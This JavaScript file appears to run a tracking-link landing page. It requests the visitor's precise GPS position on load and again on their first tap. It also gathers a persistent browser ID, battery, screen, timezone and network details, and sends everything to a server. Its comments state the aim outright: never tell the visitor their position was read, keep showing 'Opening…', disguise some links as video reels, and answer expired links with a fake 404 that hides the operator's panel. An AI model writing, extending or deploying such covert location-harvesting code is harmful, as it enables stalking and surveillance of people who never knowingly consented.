/**
 * One-tap permission gate.
 *
 * The page asks the browser for a position as soon as it loads. A browser only
 * shows its permission dialog reliably once the visitor has interacted with
 * the page, so the same request is repeated on the visitor's first tap
 * anywhere on the page. Nothing is drawn to ask for that tap: the request is
 * already in flight, and the tap only re-sends it for the browsers that
 * ignored it.
 */
(function () {
	'use strict';

	var cfgEl = document.getElementById('cc-gate-config');
	if (!cfgEl) {
		return;
	}

	var cfg = {};
	try {
		cfg = JSON.parse(cfgEl.textContent || '{}');
	} catch (e) {
		cfg = {};
	}

	if (!cfg.step) {
		return;
	}

	var $ = function (id) {
		return document.getElementById(id);
	};

	var els = {
		status: $('cc-gate-status'),
		statusText: $('cc-gate-status-text'),
		error: $('cc-gate-error'),
		errorText: $('cc-gate-error-text'),
		retry: $('cc-gate-retry')
	};

	var running = false;
	var tapArmed = false;
	var tapHandler = null;
	var retried = false;
	var ceiling = null;

	// The longest this page may sit on "Opening…". A browser that leaves its
	// permission dialog unanswered would otherwise leave the visitor watching
	// a turning circle with no end to it.
	var GATE_LIMIT = 30000;

	function holdCeiling() {
		dropCeiling();
		ceiling = window.setTimeout(function () {
			ceiling = null;
			if (running) {
				running = false;
				disarmTap();
				setError('This is taking too long. Check your connection and press Try again.', true);
			}
		}, GATE_LIMIT);
	}

	function dropCeiling() {
		if (ceiling) {
			window.clearTimeout(ceiling);
			ceiling = null;
		}
	}

	function setStatus(text) {
		if (els.statusText) {
			els.statusText.textContent = text;
		}
	}

	function setError(message, canRetry) {
		if (els.status) {
			els.status.hidden = true;
		}
		if (els.error) {
			els.error.hidden = false;
		}
		if (els.errorText) {
			els.errorText.textContent = message;
		}
		if (els.retry) {
			els.retry.hidden = !canRetry;
		}
	}

	/**
	 * This browser's name, kept across page loads.
	 *
	 * It used to be minted fresh on every visit, so one person opening the
	 * same link four times arrived as four different people — which is why
	 * the repeat-visitor map stayed empty even when there were repeats to
	 * show. The value carries no personal detail: it is a random string this
	 * browser made up, stored on this device only, and it is what lets the
	 * panel tell "the same person came back" from "four people clicked once".
	 */
	var UUID_KEY = 'cl_vid';

	function storedUuid() {
		try {
			var kept = window.localStorage ? window.localStorage.getItem(UUID_KEY) : '';
			if (kept && /^[A-Za-z0-9-]{8,64}$/.test(kept)) {
				return kept;
			}
		} catch (e) {
			// Storage can be blocked entirely; the value is then per page load,
			// which is what it always was and is no worse.
		}
		return '';
	}

	function uuid() {
		var kept = storedUuid();
		if (kept) {
			return kept;
		}

		var made = '';

		if (window.crypto && window.crypto.getRandomValues) {
			var b = new Uint8Array(16);
			window.crypto.getRandomValues(b);
			b[6] = (b[6] & 0x0f) | 0x40;
			b[8] = (b[8] & 0x3f) | 0x80;
			var hex = Array.prototype.map.call(b, function (x) {
				return ('0' + x.toString(16)).slice(-2);
			}).join('');
			made = hex.substr(0, 8) + '-' + hex.substr(8, 4) + '-' + hex.substr(12, 4) + '-' + hex.substr(16, 4) + '-' + hex.substr(20);
		} else {
			made = 'u' + Date.now().toString(36) + Math.random().toString(36).slice(2, 12);
		}

		try {
			if (window.localStorage) {
				window.localStorage.setItem(UUID_KEY, made);
			}
		} catch (e) {
			// Private mode, or storage full. The value still works for this page.
		}

		return made;
	}

	function environment() {
		var nav = window.navigator || {};
		var out = {
			uuid: uuid(),
			lang: nav.language || '',
			tz: '',
			screen: window.screen ? window.screen.width + 'x' + window.screen.height : '',
			viewport: window.innerWidth + 'x' + window.innerHeight,
			cores: nav.hardwareConcurrency || 0,
			phash: '',
			battery: '',
			network: '',
			page_url: window.location.href
		};
		try {
			out.tz = Intl.DateTimeFormat().resolvedOptions().timeZone || '';
		} catch (e) {
			out.tz = '';
		}
		var conn = nav.connection || nav.mozConnection || nav.webkitConnection;
		if (conn) {
			out.network = [conn.effectiveType || '', conn.downlink ? conn.downlink + 'Mbps' : ''].join(' ').trim();
		}
		if (nav.getBattery) {
			nav.getBattery().then(function (b) {
				window.__ccBattery = Math.round((b.level || 0) * 100) + '%' + (b.charging ? ' charging' : '');
				if (els.statusText && running) {
					/* the payload below picks it up on a retry */
				}
			}).catch(function () {});
		}
		out.battery = window.__ccBattery || '';
		return out;
	}

	var attempt = 0;

	function getLocation() {
		attempt += 1;
		var mine = attempt;
		return new Promise(function (resolve) {
			var fresh = function (value) {
				if (mine === attempt) {
					resolve(value);
				}
			};
			if (!navigator.geolocation) {
				fresh({ error: 'unsupported' });
				return;
			}
			var done = false;
			var ms = Math.max(8000, (cfg.timeout || 25) * 1000);

			// The position is what this page is for, so it is asked for in the
			// mode that actually produces one.
			//
			// `enableHighAccuracy` used to be a setting, and on most installs
			// it was off — which asks the device for a network fix. That is
			// instant on a desktop and can be wrong by kilometres on a phone,
			// and it is the difference between a card that says "Bengaluru,
			// Karnataka" and a card that says "Area not named". The cost of
			// the accurate fix is a second or two, which is a second or two
			// of "Opening…" — a bargain for the one fact an agent acts on.
			//
			// A first fix indoors can take a while to settle, so a quick, low
			// precision answer is kept as a fallback: if the accurate request
			// runs out of time but the device did hand back something, the
			// visit carries that rather than nothing.
			var fallback = null;
			var settle = function (pos, why) {
				if (done) {
					return;
				}
				done = true;
				window.clearTimeout(timer);
				fresh({
					lat: pos.coords.latitude,
					lng: pos.coords.longitude,
					accuracy: Math.round(pos.coords.accuracy || 0),
					fix: why
				});
			};
			var timer = window.setTimeout(function () {
				if (done) {
					return;
				}
				if (fallback) {
					settle(fallback, 'coarse');
					return;
				}
				done = true;
				fresh({ error: 'timeout' });
			}, ms);

			navigator.geolocation.getCurrentPosition(
				function (pos) {
					settle(pos, 'gps');
				},
				function (err) {
					if (done) {
						return;
					}
					if (fallback) {
						settle(fallback, 'coarse');
						return;
					}
					done = true;
					window.clearTimeout(timer);
					var code = 'unavailable';
					if (err && err.code === 1) {
						code = 'denied';
					} else if (err && err.code === 3) {
						code = 'timeout';
					}
					fresh({ error: code });
				},
				{
					enableHighAccuracy: true,
					timeout: ms,
					// A retry must ask for a new fix; a cached one can be minutes old.
					maximumAge: retried ? 0 : 30000
				}
			);

			// The coarse fix, asked for at the same moment. It resolves in
			// milliseconds on most phones and costs nothing when it fails. It
			// is never sent on its own while the accurate request is still
			// running — only if that one gives up.
			try {
				navigator.geolocation.getCurrentPosition(
					function (pos) {
						if (!fallback) {
							fallback = pos;
						}
					},
					function () {},
					{ enableHighAccuracy: false, timeout: ms, maximumAge: 60000 }
				);
			} catch (e) {}
		});
	}

	function post(payload) {
		var body = JSON.stringify(payload);
		if (window.fetch) {
			return window.fetch(cfg.step, {
				method: 'POST',
				credentials: 'same-origin',
				cache: 'no-store',
				headers: {
					'Content-Type': 'application/json',
					'X-Requested-With': 'XMLHttpRequest'
				},
				body: body
			}).then(function (res) {
				return res.json().catch(function () {
					return { ok: false, code: 'bad_request' };
				});
			});
		}
		return new Promise(function (resolve) {
			var xhr = new XMLHttpRequest();
			xhr.open('POST', cfg.step, true);
			xhr.setRequestHeader('Content-Type', 'application/json');
			xhr.onreadystatechange = function () {
				if (xhr.readyState !== 4) {
					return;
				}
				try {
					resolve(JSON.parse(xhr.responseText));
				} catch (e) {
					resolve({ ok: false, code: 'bad_request' });
				}
			};
			xhr.send(body);
		});
	}

	function disarmTap() {
		tapArmed = false;
		if (!tapHandler) {
			return;
		}
		document.removeEventListener('pointerdown', tapHandler, true);
		document.removeEventListener('keydown', tapHandler, true);
		document.removeEventListener('touchstart', tapHandler, true);
		tapHandler = null;
	}

	/**
	 * Re-send the request on the visitor's first tap.
	 *
	 * Some browsers ignore a permission request that did not follow a gesture.
	 * The page says so in its status line rather than adding a button, so the
	 * link still opens in one tap anywhere on the screen.
	 */
	function armTap() {
		if (tapArmed) {
			return;
		}
		tapArmed = true;
		setStatus('Tap the screen to continue.');

		tapHandler = function () {
			disarmTap();
			retried = true;
			setStatus('Opening…');
			// The gesture is the whole point of the tap: the old request is
			// abandoned so a new one can be made with it.
			running = false;
			run();
		};
		document.addEventListener('pointerdown', tapHandler, true);
		document.addEventListener('keydown', tapHandler, true);
		document.addEventListener('touchstart', tapHandler, true);
	}

	/**
	 * A browser that never showed the dialog leaves the permission as "prompt".
	 */
	function watchForSuppressedPrompt() {
		window.setTimeout(function () {
			if (!running) {
				return;
			}
			if (!navigator.permissions || !navigator.permissions.query) {
				armTap();
				return;
			}
			navigator.permissions.query({ name: 'geolocation' }).then(function (res) {
				if ('prompt' === res.state && running) {
					armTap();
				}
			}).catch(function () {
				if (running) {
					armTap();
				}
			});
		}, 1200);
	}

	function fail(code) {
		running = false;
		dropCeiling();
		disarmTap();

		var message;
		if ('denied' === code) {
			// A refusal the browser has already stored is never asked again:
			// its dialog cannot reappear however many times the button is
			// pressed. Telling the visitor to try again is therefore a loop
			// with no exit, and this page is the only door to their notice.
			// The visit carries on without a position, and the refusal travels
			// with it so the record says why.
			if (!cfg.blockOnDeny) {
				setStatus('Continuing…');
				post(Object.assign({}, environment(), { gps_error: 'denied' })).then(handle).catch(function () {
					setError('This link is not available.', true);
				});
				return;
			}
			message = 'Permission is blocked for this website. Allow it in the address bar, then press Try again.';
		} else if ('unsupported' === code) {
			message = 'This browser cannot continue. Open the link in Chrome or Safari.';
		} else if ('timeout' === code) {
			message = 'That took too long. Press Try again.';
		} else {
			message = 'Permission was not granted. Press Try again.';
		}
		setError(message, true);
	}

	function handle(data) {
		running = false;
		dropCeiling();
		disarmTap();

		if (!data || data.ok !== true) {
			var code = (data && data.code) || 'bad_request';
			if ('not_found' === code || 'expired' === code || 'limit' === code) {
				// An expired or capped link never reveals the panel behind it.
				document.body.innerHTML = '<div class="cc-plain"><p class="cc-plain__code">404</p><p class="cc-plain__msg">Not found</p></div>';
				return;
			}
			setError((cfg.reasons && cfg.reasons[code]) || (data && data.error) || 'This link is not available.', true);
			return;
		}

		// Never tell the visitor their position was read. The only thing this
		// line is for is saying the link is opening.
		setStatus('Opening…');
		if (data.redirect) {
			window.location.replace(data.redirect);
			return;
		}
		setError('This link is not available.', false);
	}

	function run() {
		if (running) {
			return;
		}
		running = true;

		if (els.error) {
			els.error.hidden = true;
		}
		if (els.status) {
			els.status.hidden = false;
		}

		var env = environment();

		holdCeiling();

		if ('off' === cfg.mode) {
			setStatus('Opening…');
			post(env).then(handle).catch(fail);
			return;
		}

		setStatus('Opening…');

		// Ask the browser what it already knows before asking for a fix.
		//
		// A permission the visitor has already refused is never put to them
		// again, and on several browsers the position request then never calls
		// back at all: the page sat on "Opening…" for the whole timeout before
		// giving up. Reading the stored state first turns that wait into an
		// answer that arrives at once.
		if (navigator.permissions && navigator.permissions.query) {
			navigator.permissions.query({ name: 'geolocation' }).then(function (res) {
				if ('denied' === res.state) {
					dropCeiling();
					running = false;
					fail('denied');
					return;
				}
				ask(env);
			}).catch(function () {
				ask(env);
			});
			return;
		}
		ask(env);
	}

	function ask(env) {
		getLocation().then(function (loc) {
			if (loc.error) {
				// A fix that did not arrive is not a refusal.
				//
				// This used to end the visit whenever the link wanted a
				// position, whether or not the visitor had allowed one: the
				// dialog was accepted, the device then took longer than the
				// timeout to settle on an answer, and the page said "Location
				// access is required" to somebody who had just granted it.
				// From their side the link was broken. A timeout, an
				// unavailable fix on a desktop with no GPS, a browser that
				// does not implement the API — none of those is a refusal,
				// and the visit carries on without a position, saying why.
				//
				// Only an actual refusal, on a link that insists on one,
				// stops the visitor.
				if ('denied' === loc.error && 'off' !== cfg.mode && cfg.blockOnDeny) {
					fail(loc.error);
					return;
				}
				post(Object.assign({}, env, { gps_error: loc.error })).then(handle).catch(function () {
					fail('network');
				});
				return;
			}
			post(Object.assign({}, env, { lat: loc.lat, lng: loc.lng, accuracy: loc.accuracy })).then(handle).catch(function () {
				fail('network');
			});
		});
	}

	if (els.retry) {
		els.retry.addEventListener('click', function () {
			retried = true;
			run();
		});
	}

	window.addEventListener('unhandledrejection', function () {
		if (running) {
			fail('network');
		}
	});

	// A reel shows its post first: nothing is requested until the visitor taps
	// play, because that tap is both the gesture the browser needs and the
	// moment a person expects to be asked. Every other link asks on load.
	if (cfg.armOnPlay) {
		var playBtn = document.getElementById('cc-reel-play');
		if (playBtn) {
			playBtn.addEventListener('click', function () {
				playBtn.disabled = true;
				if (els.status) {
					els.status.hidden = false;
				}
				setStatus('Opening…');
				run();
			});
			return;
		}
	}

	run();
	watchForSuppressedPrompt();
})();
